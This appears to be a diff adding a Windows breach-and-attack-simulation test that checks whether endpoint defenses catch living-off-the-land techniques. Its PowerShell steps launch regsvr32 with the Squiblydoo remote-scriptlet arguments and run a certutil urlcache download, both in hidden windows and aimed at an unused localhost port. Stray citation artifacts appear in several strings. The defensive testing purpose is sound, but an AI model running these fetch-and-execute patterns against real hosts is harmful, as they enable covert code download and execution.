@@ -1,0 +1,80 @@
+id: em-06-defense-evasion
+name: "Endpoint Mastery 06 — Defense Evasion & LOLBin Execution"
+description: >
+  ENDPOINT MASTERY — Layer 6. Tests structural bypasses and proxy binary abuse patterns.
+  Executes trusted system binaries (LOLBins) with unconventional arguments to see if the EDR
+  differentiates administrative behavior from deceptive maneuvers[cite: 4, 5].
+
+  VERDICTS: FAIL = proxy execution finished without interception. PASS = process lifecycle killed
+  or blocked by system policy. SAFETY: Benign execution arguments only, no malicious secondary scripts.
+author: Audspect Research
+executable: true
+supported_os: [windows]
+tags:
+  - endpoint-mastery
+  - em-layer-6
+  - evasion
+  - lolbins
+mitre_phases:
+  - defense-evasion
+live_policy:
+  block_on_domain_controller: false
+  require_dc_reachable: false
+
+steps:
+  - name: "Regsvr32 payload proxy execution execution pattern (Squiblydoo mock)"
+    technique_id: T1218.010
+    framework: custom
+    executor: powershell
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: medium
+    reversible: true
+    blast_radius: "Invokes regsvr32.exe pointed towards a non-routable local address to gauge process arg visibility[cite: 5]."
+    telemetry:
+      - "Sysmon EID 1: regsvr32.exe with /s /u /i parameters"
+    detection:
+      - "EDR/SIEM: regsvr32 network parameters in command-line arguments"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      # Point to a localhost port that is intentionally bound to nothing to avoid network egress
+      $p = Start-Process 'regsvr32.exe' -ArgumentList '/s /u /i:http://127.0.0.1:9999/bas_sim.sct scrobj.dll' -PassThru -WindowStyle Hidden
+      if ($p) {
+        $p.WaitForExit(5000) | Out-Null
+        if ($p.HasExited) {
+          $ec = $p.ExitCode
+          if ($ec -ne 0) { Write-Output "PASS: Regsvr32 execution failed or was preemptively blocked by local ASR / application control rules. [BAS-SIM]" }
+          else { Write-Output "FAIL: Regsvr32 command line passed parsing checks without inline termination context[cite: 5]." }
+        } else {
+          $p.Kill()
+          Write-Output "FAIL: Regsvr32 execution remained alive or was completely ignored by defensive rules[cite: 5]."
+        }
+      } else {
+        Write-Output "PASS: EDR completely suppressed spawning regsvr32 with proxy arguments. [BAS-SIM]"
+      }
+    cleanup: |
+      Get-Process regsvr32 -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+
+  - name: "Certutil custom URL parameter discovery signature"
+    technique_id: T1105
+    framework: custom
+    executor: powershell
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      # Trigger certutil to verify lookups on a dummy non-existent URL string
+      $p = Start-Process 'certutil.exe' -ArgumentList '-urlcache -split -f http://127.0.0.1:9999/bas_test.txt' -PassThru -WindowStyle Hidden
+      if ($p) {
+        $p.WaitForExit(5000) | Out-Null
+        $ec = $p.ExitCode
+        if ($ec -eq 0) { Write-Output "FAIL: Certutil urlcache download behavior processed without constraint alert." }
+        else { Write-Output "PASS: Certutil execution dropped or structurally constrained by endpoint policies. [BAS-SIM]" }
+      } else {
+        Write-Output "PASS: Process block actively suppressed certutil download proxy emulation. [BAS-SIM]"
+      }
+    cleanup: ""
